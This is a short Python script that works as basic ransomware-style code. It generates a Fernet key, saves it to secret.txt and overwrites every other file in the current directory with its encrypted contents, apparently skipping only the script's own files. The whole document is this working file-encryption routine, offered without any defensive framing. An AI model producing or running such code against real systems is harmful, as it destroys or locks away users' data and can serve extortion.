from cryptography.fernet import Fernet
import os

key = Fernet.generate_key()
print(key)

def encrypt(mess):
    ciphertext = Fernet(key).encrypt(mess)
    return ciphertext


#encrypt
for i in os.listdir():    
    if i == "test.py" or i == "test2.py" or i == "secret.txt" or os.path.isfile(i)==False:
        continue
    else:        
        with open (i, "rb") as f:
            contents = f.read()
            
        ciphertext = encrypt(contents)

        with open("secret.txt", "wb") as f:
            f.write(key)
            
        #overwrite
        with open (i, "wb") as f:
            overwrite = f.write(ciphertext)

        print(f"{i} encrypted")

    